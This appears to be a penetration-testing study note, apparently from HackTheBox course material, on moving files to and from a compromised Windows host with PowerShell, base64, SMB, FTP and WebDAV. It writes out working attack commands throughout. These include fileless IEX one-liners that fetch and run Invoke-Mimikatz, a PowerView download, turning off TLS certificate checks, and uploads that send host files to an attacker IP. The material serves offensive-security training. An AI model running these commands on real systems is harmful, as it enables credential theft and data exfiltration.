# Windows File Transfers Methods

<!-- TOC -->
* [Windows File Transfers Methods](#windows-file-transfers-methods)
  * [PowerShell Base64 Encode & Decode](#powershell-base64-encode--decode)
    * [Pwnbox Check SSH Key MD5 Hash](#pwnbox-check-ssh-key-md5-hash)
    * [Pwnbox Encode SSH Key to Base64](#pwnbox-encode-ssh-key-to-base64)
    * [Confirming the MD5 Hashes Match](#confirming-the-md5-hashes-match)
  * [PowerShell Web Downloads](#powershell-web-downloads)
    * [PowerShell DownloadFile Method](#powershell-downloadfile-method)
    * [File Download](#file-download)
    * [PowerShell DownloadString - Fileless Method](#powershell-downloadstring---fileless-method)
    * [PowerShell Invoke-WebRequest](#powershell-invoke-webrequest)
    * [Common Errors with PowerShell](#common-errors-with-powershell)
  * [SMB Downloads](#smb-downloads)
    * [Create the SMB Server](#create-the-smb-server)
    * [Copy a File from the SMB Server](#copy-a-file-from-the-smb-server)
    * [Create the SMB Server with a Username and Password](#create-the-smb-server-with-a-username-and-password)
    * [Mount the SMB Server with Username and Password](#mount-the-smb-server-with-username-and-password)
  * [FTP Downloads](#ftp-downloads)
    * [Installing the FTP Server Python3 Module - pyftpdlib](#installing-the-ftp-server-python3-module---pyftpdlib)
    * [Setting up a Python3 FTP Server](#setting-up-a-python3-ftp-server)
    * [Transferring Files from an FTP Server Using PowerShell](#transferring-files-from-an-ftp-server-using-powershell)
  * [PowerShell Base64 Encode & Decode](#powershell-base64-encode--decode-1)
    * [Encode File Using PowerShell](#encode-file-using-powershell)
    * [Decode Base64 String in Linux](#decode-base64-string-in-linux)
  * [PowerShell Web Uploads](#powershell-web-uploads)
    * [Installing a Configured WebServer with Upload](#installing-a-configured-webserver-with-upload)
    * [PowerShell Script to Upload a File to Python Upload Server](#powershell-script-to-upload-a-file-to-python-upload-server)
  * [PowerShell Base64 Web Upload](#powershell-base64-web-upload)
  * [SMB Uploads](#smb-uploads)
    * [Configuring WebDav Server](#configuring-webdav-server)
    * [Installing WebDav Python modules](#installing-webdav-python-modules)
    * [Using the WebDav Python module](#using-the-webdav-python-module)
    * [Connecting to the Webdav Share](#connecting-to-the-webdav-share)
    * [Uploading Files using SMB](#uploading-files-using-smb)
  * [FTP Uploads](#ftp-uploads)
    * [PowerShell Upload File](#powershell-upload-file)
  * [Summary](#summary)
  * [Downloads](#downloads)
    * [Base64 Encode & Decode](#base64-encode--decode)
    * [PowerShell DownloadFile](#powershell-downloadfile)
    * [FTP Downloads](#ftp-downloads-1)
    * [SMB Downloads](#smb-downloads-1)
  * [Uploads](#uploads)
    * [Base64 Encode & Decode](#base64-encode--decode-1)
    * [FTP Uploads](#ftp-uploads-1)
    * [PowerShell Web Uploads](#powershell-web-uploads-1)
    * [SMB Uploads](#smb-uploads-1)
<!-- TOC -->

## PowerShell Base64 Encode & Decode

Depending on the file size we want to transfer, we can use different methods that do not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy
its contents from the terminal and perform the reverse operation, decoding the file in the original content

An essential step in using this method is to ensure the file you encode and decode is correct. We can use md5sum, a program that calculates and verifies 128-bit MD5 checksums. The MD5 hash functions
as a compact digital fingerprint of a file, meaning a file should have the same MD5 hash everywhere.

### Pwnbox Check SSH Key MD5 Hash

```bash
  
  md5sum ~/.ssh/id_rsa
  #  2c6ee24b09816a6f14f95d1698b24ead id_rsa
```

### Pwnbox Encode SSH Key to Base64

```bash
  cat id_rsa | base64 -w 0;echo
    #  MIICXQIBAAKBgQDL2c6ee24b09816a6f14f95d1698b24ead...
```

We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.

```powershell
  C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1N"))
```

### Confirming the MD5 Hashes Match

Finally, we can confirm if the file was transferred successfully using the `Get-FileHash` cmdlet, which does the same thing that `md5sum` does.

```powershell
  C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5
    #  Algorithm       Hash                                Path
    #  ---------       ----                                ----
    #  MD5             2C6EE24B09816A6F14F95D1698B24EAD   C:\Users\Public\id_rsa
```

## PowerShell Web Downloads

PowerShell offers many file transfer options. In any version of PowerShell, the `System.Net.WebClient` class can be used to download a file over `HTTP`, `HTTPS` or `FTP`. The following **table**
describes WebClient methods for downloading data from a resource:

| Método              | Descripción                                                               |
|---------------------|---------------------------------------------------------------------------|
| OpenRead            | Returns the data from a resource as a Stream.                             |
| OpenReadAsync       | Returns the data from a resource without blocking the calling thread.     |
| DownloadData        | Downloads data from a resource and returns a Byte array.                  |
| DownloadDataAsync   | Downloads data from a resource and returns a Byte array without blocking. |
| DownloadFile        | Downloads data from a resource to a local file.                           |
| DownloadFileAsync   | Downloads data from a resource to a local file without blocking.          |
| DownloadString      | Downloads a String from a resource and returns a String.                  |
| DownloadStringAsync | Downloads a String from a resource without blocking the calling thread.   |

### PowerShell DownloadFile Method

We can specify the class name `Net.WebClient` and the method `DownloadFile` with the parameters corresponding to the URL of the target file to download and the output file name.

### File Download

``` powershell
  C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
  C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

  C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
  C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

### PowerShell DownloadString - Fileless Method

As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks.
Instead of downloading a PowerShell script to disk, we can run it directly in memory using the `Invoke-Expression` cmdlet or the alias `IEX`.

```powershell
  C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

`IEX` also accepts pipeline input.

```powershell
  C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### PowerShell Invoke-WebRequest

From PowerShell 3.0 onwards, the **Invoke-WebRequest** cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the *
*Invoke-WebRequest** full name.

```powershell
  C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

### Common Errors with PowerShell

- There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter -`UseBasicParsing`.
- Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
    ```powershell
  C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
    ```

## SMB Downloads

The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to
and from remote servers.

We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)
from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool
that allows connection to SMB.

### Create the SMB Server

```bash
 sudo impacket-smbserver share -smb2support /tmp/smbshare
```

### Copy a File from the SMB Server

To download a file from the SMB server to the current working directory, we can use the following command:

```posershell
  C:\hrb> copy \\<SMB Server>\<Share>\<File> .
  C:\htb> copy \\192.168.220.133\share\nc.exe
```

New versions of Windows block unauthenticated guest access. To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows
target machine:

### Create the SMB Server with a Username and Password

```bash
 sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

### Mount the SMB Server with Username and Password

```powershell
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

> Note: You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.

## FTP Downloads

Another way to transfer files is using FTP (File Transfer Protocol), which use port **TCP/21** and **TCP/20**. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP
server.

We can configure an FTP Server in our attack host using Python3 `pyftpdlib` module. It can be installed with the following command:

### Installing the FTP Server Python3 Module - pyftpdlib

```bash
  sudo apt install python3-pyftpdlib
```

Then we can specify port number **21** because, by default, `pyftpdlib` uses port **2121**. Anonymous authentication is enabled by default if we don't set a user and password.

### Setting up a Python3 FTP Server

```bash
  sudo python3 -m pyftpdlib -p 21
```

After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell `Net.WebClient`.

### Transferring Files from an FTP Server Using PowerShell

```powershell
  C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

## PowerShell Base64 Encode & Decode

We saw how to decode a base64 string using Powershell. Now, let's do the reverse operation and encode a file so we can decode it on our attack host.

### Encode File Using PowerShell

```powershell
  C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
  # IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwO ....
  C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

  Hash
  ----
  3688374325B992DEF12793500307566D
```

We copy this content and paste it into our attack host, use the `base64` command to decode it, and use the `md5sum` application to confirm the transfer happened correctly.

### Decode Base64 String in Linux

```bash
  echo "IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwO ...." | base64 -d > hosts
  md5sum hosts
  # 3688374325b992def12793500307566d  hosts
```

## PowerShell Web Uploads

PowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function. We'll also need a web server that accepts
uploads, which is not a default option in most common webserver utilities.

For our web server, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the [Python HTTP.server](https://docs.python.org/3/library/http.server.html) module,
which includes a file upload page. Let's install it and start the webserver.

### Installing a Configured WebServer with Upload

```bash
  sudo apt install python3-pip
  pip3 install uploadserver
  python3 -m uploadserver --port 8000 --directory /var/www/html/uploads
```

Now we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses Invoke-RestMethod to perform the upload operations. The script
accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.

### PowerShell Script to Upload a File to Python Upload Server

```powershell
  C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
  C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

## PowerShell Base64 Web Upload

```powershell
  C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
  C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.

```bash
  nc -lvnp 8000
    # IyBDb3B5cmlnaHQgKG....
  echo "IyBDb3B5cmlnaHQgKG...." | base64 -d -w 0 > hosts
```

## SMB Uploads

### Configuring WebDav Server

To set up our WebDav server, we need to install two Python modules, 'wsgidav' and 'cheroot' (you can read more about this implementation here: [wsgidav github](https://github.com/mar10/wsgidav)).
After installing them, we run the wsgidav application in the target directory.

### Installing WebDav Python modules

```bash
  sudo pip3 install wsgidav cheroot
```

### Using the WebDav Python module

```bash
  sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

### Connecting to the Webdav Share

Now we can attempt to connect to the share using the **DavWWWRoot** directory.

```powershell
  C:\htb> dir \\192.168.49.128\DavWWWRoot
```

> Note: Note: **DavWWWRoot** is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles
> WebDAV requests that you are connecting to the root of the WebDAV server.
>
>You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

### Uploading Files using SMB

```powershell
  C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
  C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

## FTP Uploads

Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module `pyftpdlib`,
we need to specify the option `--write` to allow clients to upload files to our attack host.

```bash
  sudo python3 -m pyftpdlib --port 21 --write
```

Now let's use the PowerShell upload function to upload a file to our FTP Server.

### PowerShell Upload File

```powershell
  C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

## Summary

## Downloads

### Base64 Encode & Decode

```bash
  md5sum ~/.ssh/id_rsa
  # 4e301756a07ded0a2dd6953abf015278  id_rsa
  cat id_rsa | base64 -w 0;echo
  # LS0tLS1CRUdJTiBPUEVOU1N...
```

Copy the base64 string and paste it into PowerShell to decode it.

```powershell
  [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1N..."))
  Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5
```

### PowerShell DownloadFile

```powershell
  (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
  (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
  (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

**DownloadString - Fileless Method**

```powershell
  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
  (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

**PowerShell Invoke-WebRequest**

```powershell
  Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

- Prevent error for Internet Explorer first-launch configuration:
    * `-UseBasicParsing`
- Prevent error for SSL/TLS secure channel:
    * `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`

### FTP Downloads

```bash
  sudo apt install python3-pyftpdlib
  sudo python3 -m pyftpdlib -p 21
```

```powershell
  (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
``` 

**Help Command for pyftpdlib**

```bash

python3 -m pyftpdlib --help
usage: python3 -m pyftpdlib [options]

Start a stand alone anonymous FTP server.

options:
  -h, --help            show this help message and exit
  -i, --interface ADDRESS
                        specify the interface to run on (default all interfaces)
  -p, --port PORT       specify port number to run on (default 2121)
  -w, --write           grants write access for logged in user (default read-only)
  -d, --directory FOLDER
                        specify the directory to share (default current directory)
  -n, --nat-address ADDRESS
                        the NAT address to use for passive connections
  -r, --range FROM-TO   the range of TCP ports to use for passive connections (e.g. -r 8000-9000)
  -D, --debug           enable DEBUG logging level
  -v, --version         print pyftpdlib version and exit
  -V, --verbose         activate a more verbose logging
  -u, --username USERNAME
                        specify username to login with (anonymous login will be disabled and password required if supplied)
  -P, --password PASSWORD
                        specify a password to login with (username required to be useful)

```

### SMB Downloads

```bash
  sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```powershell
copy \\192.168.220.133\share\nc.exe
````

## Uploads

### Base64 Encode & Decode

```powershell
  [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
  # IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwO ....
  Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
  # Hash 
  # 3688374325B992DEF12793500307566D
```

```bash
  echo "IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwO ...." | base64 -d > hosts
  md5sum hosts
  # 3688374325b992def12793500307566d  hosts
```

** PowerShell Web Uploads**

```bash
  nc -lvnp 8000 
    # Listening on [any] 8000 ...
  echo "IyBDb3B5cmlnaHQgKG...." | base64 -d -w 0 > hosts
```

```powershell
  $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
  Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

### FTP Uploads

```bash
  sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
  C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

### PowerShell Web Uploads

```bash
  pip3 install uploadserver
  python3 -m uploadserver 8000

```
[PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) is a PowerShell script that uses Invoke-RestMethod to upload files to the uploadserver.
```powershell
  IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
  Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

**Help Command for uploadserver**

```bash

python -m uploadserver --help                             
usage: __main__.py [-h] [--cgi] [--allow-replace] [--bind ADDRESS] [--directory DIRECTORY] [--theme {light,auto,dark}]
                   [--server-certificate SERVER_CERTIFICATE] [--client-certificate CLIENT_CERTIFICATE]
                   [--basic-auth BASIC_AUTH] [--basic-auth-upload BASIC_AUTH_UPLOAD]
                   [port]

positional arguments:
  port                  Specify alternate port [default: 8000]

options:
  -h, --help            show this help message and exit
  --cgi                 Run as CGI Server
  --allow-replace       Replace existing file if uploaded file has the same name. Auto rename by default.
  --bind, -b ADDRESS    Specify alternate bind address [default: all interfaces]
  --directory, -d DIRECTORY
                        Specify alternative directory [default:current directory]
  --theme {light,auto,dark}
                        Specify a light or dark theme for the upload page [default: auto]
  --server-certificate, --certificate, -c SERVER_CERTIFICATE
                        Specify HTTPS server certificate to use [default: none]
  --client-certificate CLIENT_CERTIFICATE
                        Specify HTTPS client certificate to accept for mutual TLS [default: none]
  --basic-auth BASIC_AUTH
                        Specify user:pass for basic authentication (downloads and uploads)
  --basic-auth-upload BASIC_AUTH_UPLOAD
                        Specify user:pass for basic authentication (uploads only)
```

### SMB Uploads

```bash
  sudo pip3 install wsgidav cheroot
  sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```powershell
  dir \\192.168.49.128\DavWWWRoot
  copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
  copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

> Note: DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server